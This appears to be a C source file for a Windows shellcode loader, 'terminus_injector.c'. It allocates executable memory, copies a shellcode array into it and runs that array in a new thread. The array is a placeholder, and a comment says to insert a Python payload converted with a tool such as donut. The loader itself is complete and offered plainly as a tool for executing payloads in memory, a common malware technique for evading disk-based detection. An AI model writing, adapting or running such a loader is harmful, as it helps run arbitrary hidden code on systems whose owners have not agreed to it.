/* 
 * file: terminus_injector.c
 * desc: raw memory execution. compiles to a tiny, fast binary.
 * compile: gcc -o ti.exe terminus_injector.c
 */

#include <windows.h>
#include <stdio.h>

// this would be your python payload compiled to shellcode via something like donut
unsigned char terminus_shellcode[] = {
    0x90, 0x90, 0x90, 0x90, // NOP sled
    // ... [insert actual shellcode here] ...
    0xc3 // RET
};

int main() {
    void *exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    printf("[*] allocating memory...\n");
    // allocate memory that is read/write/execute
    exec_mem = VirtualAlloc(0, sizeof(terminus_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    printf("[*] copying terminus soul to memory...\n");
    RtlMoveMemory(exec_mem, terminus_shellcode, sizeof(terminus_shellcode));
    
    printf("[*] executing...\n");
    // run it as a new thread so the main process can exit or do other things
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(th, -1);
    
    return 0;
}